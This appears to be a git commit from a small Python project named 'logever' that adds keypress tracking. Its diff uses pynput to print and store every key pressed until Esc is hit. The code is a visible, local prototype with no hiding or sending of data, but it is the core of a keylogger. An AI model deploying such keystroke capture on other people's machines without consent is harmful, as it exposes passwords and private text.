52d28c04dd8626d663678750093f1937b91f0da2
santhossunthar <santhoshsunthar@gmail.com>
2022-03-11 02:13:15 +0530

    Added keypress tracking

--- src/logever.py
+++ src/logever.py
@@ -1,1 +1,15 @@
 from pynput.keyboard import Key, Listener
+
+keys = []
+
+def onPress(key):
+    print(key, end=" Pressed\n")
+    global keys
+    keys.append(str(key))
+        
+def onRelease(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=onPress, on_release=onRelease) as listener:
+    listener.join()
